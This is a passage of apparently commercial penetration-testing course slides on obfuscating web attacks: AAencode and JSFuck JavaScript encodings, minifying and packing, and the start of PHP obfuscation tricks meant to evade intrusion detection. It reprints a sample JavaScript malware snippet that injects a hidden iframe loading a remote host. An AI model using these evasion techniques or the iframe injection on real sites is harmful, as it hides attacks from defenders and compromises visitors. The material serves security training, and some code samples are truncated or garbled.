2.3.1.6 AAencode
A different approach is with AAencode. It is inspired by
Japanese style emoticons, like（●＾o＾●）for instance.
ﾟωﾟﾉ= /｀ｍ´）ﾉ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ
)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ: ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ:(ﾟωﾟﾉ+ '_')[o^_^o
-(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟ
Дﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ)
['o']+(ﾟωﾟﾉ+'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_')
[ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) -(ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ)
['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+
(ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+
(ﾟωﾟﾉ+'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟ
o)=(ﾟωﾟﾉ+'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟε
ﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ [continue]
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.59
2.3.1.7 JSFuck
One of the latest interesting encodings originated from a
discussion on sla.ckers.org. The idea was to use only 6
different characters to write and execute JavaScript code.
The implementation is called: JSFuck.
The six characters allowed are . The concept is to start
()+[]!
from atomic parts of JavaScript and from that construct
the encoded payload.
http://web.archive.org/web/20110707162819/http://sla.ckers.org/forum/ WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.60
read.php?24,32930
2.3.1.7 JSFuck
Below are some basic atomic parts, the full list is on github.
'SIMPLE' string
false ![]
true !![]
Undefined [][[]] Array []
NaN +[![]] Number +[]
Infinity +(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+ String []+[]
[+!+[]]+[+[]]+[+[]]+[+[]])
Boolean ![]
Function []["filter"]
eval []["filter"]["constructor"]( CODE)()
'CONSTRUCTOR'
window []["filter"]["constructor"]("return this")()
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.61
2.3.1.7 JSFuck
The result is something like this:
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]
)[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![
]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]
+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+
([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[
!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[
])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(
![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[
]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+
[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]
+!+[]]+(!![]+[])[+[]]+(!![]+[]) [continue]
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.62
2.3.2 JavaScript Compressing
To make JavaScript run faster, developers often use tools
that compile JavaScript into more compact and higher
performing code.
By using these tools, it is also possible to obfuscate code
and evade detection. This is what we are going to be
looking for in this chapter.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.63
2.3.2.1 Minifying
The process of minifying JavaScript code is by removing all
unnecessary characters without changing the functionality
of the original code.
Basically, all characters are removed that are used to add
readability to the code. These characters are ignored by the
interpreter. Examples of these are: whitespaces, new line,
comments.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.64
2.3.2.1 Minifying
Let’s consider the following JavaScript malware code:
/* Make a Frame*/
function MakeFrameEx(){
element = do​cument.get​ElementById('yahoo_api');
if (!element){
var el = do​cument.cr​eateElement('if​rame');
do​cument.body.append​Child(el);
el.id = 'yahoo_api';
el.style.width = '1px';
el.style.height = '1px';
el.style.display = 'none';
el.src = 'http://10.10.10.21/do?' //source obfuscated
}
}
var ua = navigator.userAgent.toLowerCase();
if (((ua.indexOf("msie") !=- 1 && ua.indexOf("opera") ==- 1 && ua.indexOf("webtv") ==- 1))
&& ua.indexOf("windows") !=- 1){
var t = setTimeout("MakeFrameEx()", 1000)
}
Original code taken from http://aw-snap.info/articles/js-examples.php WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.65
2.3.2.1 Minifying
Once minified, we have something like the following:
function
MakeFrameEx(){element=do​cument.get​ElementById('yahoo_api');if(!element){var
el=do​cument.cr​eateElement('if​rame');do​cument.body.append​Child(el);el.id='yahoo_api
';el.style.width='1px';el.style.height='1px';el.style.display='none';el.src='http:
//10.10.10.21/do?'}}var
ua=navigator.userAgent.toLowerCase();if(((ua.indexOf("msie")!=-
1&&ua.indexOf("opera")==-1&&ua.indexOf("webtv")==-1))&&ua.indexOf("windows")!=-
1){var t=setTimeout("MakeFrameEx()",1000)}
As you may notice, even if the code is compact, it is still possible
to read it without any issues other than a minor inconvenience.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.66
2.3.2.1 Minifying
The minification technique is very useful compressing large
libraries. For example, jQuery libraries are already
compressed.
/*! jQuery v2.1.0 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof
module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new
Error("jQuery requires a window with a document");return
b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var
c=[],d=c.slice,e=c.concat,f=c.push,g=c.indexOf,h={},i=h.toString,j=h.hasOwnProperty,k="
".trim,l={},m=a.document,n="2.1.0",o=function(a,b){return new o.fn.init(a,b)},p=/^-ms-
/,q=/-([\da-z])/gi,r=function(a,b) [continue]
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.67
Original code taken from http://code.jquery.com/jquery-2.1.0.min.js
2.3.2.1 Minifying
The Internet is full of tools that can minify JavaScript.
Here are some valuable sources:
▪ Closure compiler by Google
▪ YUICompressor by Yahoo
▪ JSMin by Douglas Crockford
▪ Packer by Dean Edwards (Minified and Packer)
https://developers.google.com/closure/compiler/
http://yui.github.io/yuicompressor/
http://crockford.com/javascript/jsmin
http://dean.edwards.name/packer/ WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.68
2.3.2.2 Packing
A more complex way to minify JavaScript code is by
packing. A packer compresses the minified code by
shortening variable names, functions and other operations.
In other words, it makes the code unreadable.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.69
2.3.2.2 Packing
This is a screenshot of
the previous JavaScript
malware packed with
Dean Edwards's tool.
Packing options
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.70
You’ve been studying quite
intently. We recommend taking
a quick break and come back
refreshed. ^_^
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.71
2.4
PHP Obfuscation
Techniques
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.72
2.4 PHP Obfuscation Techniques
Fundamentally, there are two reasons why PHP obfuscation
techniques exist. The first is because developers need a
way to make it more difficult for others to use their code,
thereby protecting their intellectual property. The second is
aimed at defeating security systems (IDS & Co.).
Of course, the second option is more interesting and
applicable for our needs. This is especially true in
understanding how to leverage some of the language
features to obfuscate our attacks.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.73
2.4 PHP Obfuscation Techniques
"The ways of PHP obfuscation are infinite…"
NOTE: This quote is a reminder because of the fact that
this chapter is no where near a complete guide to PHP
Obfuscation. The goal here is to both present some basilar
techniques and analyze their power and effectiveness.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.74
2.4.1 Basic Language Reference
PHP is a popular language for web applications. Its main
advantage is that it is simple and easy to learn, even by
novice programmers. Another advantage is the easily
readable code.
While during programming, this is a good thing, especially if
you want to deploy code that is used for offensive
operations, as it should be formatted in a way no one can
say what it does at first sight. That’s why we want to
obfuscate PHP code.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.75
2.4.1.1 Type Juggling
Just like JavaScript, PHP is a dynamically typed language.
This means that it is possible to do things such as type
juggling.
In other words, PHP does not require/support explicit type
definition in variable declaration.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.76
2.4.1.1 Type Juggling
Basically, in PHP, a variable's type is determined by the context in
which the variable is used. In the example below, if you assign a
string value to variable $joke it becomes a string, if you then
assign an integer the type changes, and so on.
$joke = "1"; // string(1) "1"
$joke++; // int(2)
$joke += 19.8; // float(21.8)
$joke = 8 + "7 -Ignore me please-"; // int(15)
$joke = "a string" + array("1.1 another string")[0]; // float(1.1)
$joke = 3+2*(TRUE+TRUE); // int(7)
$joke .= ''; // string(1) "7"
$joke +=''; // int(7)
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.77
2.4.1.2 Numerical Data Types
The first useful data type set in PHP obfuscation is related
to numbers. With numerical data types, just like in
JavaScript, we can either access elements inside strings or
inside arrays. Then, we can use them to generate
characters and a great deal more.
Let’s check out the following examples.
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.78
2.4.1.2 Numerical Data Types
Access String / Integer Numbers
$x='Giuseppe';
echo $x[0]; // decimal index (0) > 'G'
echo $x[0001]; // octal index (1) > 'i'
echo $x[0x02]; // hexadecimal index (2) > 'u'
echo $x[0b11]; // binary index (3) > 's'
Binary integer literals are available since PHP 5.4.0
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.79
2.4.1.2 Numerical Data Types
Access String / Integer Numbers
The following image, according to the PHP documentation,
describes how the structure for integer literals are:
integer
decimal hexadecimal octal binary
[1-9][0-9]* or 0 0[xX][0-9a-fA-F]+ 0[0-7]+ 0b[01]+
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.80
2.4.1.2 Numerical Data Types
Access String / Integer Numbers
Thus, the following example is still valid code:
$x='Giuseppe';
echo $x[0]; // decimal index (0) > 'G'
echo $x[00000000000001]; // octal index (1) > 'i'
echo $x[0x000000000002]; // hexadecimal index (2) > 'u'
echo $x[0b000000000011]; // binary index (3) > 's'
WAPTXv2: Section 01, Module 02 -Caendra Inc. © 2020| p.81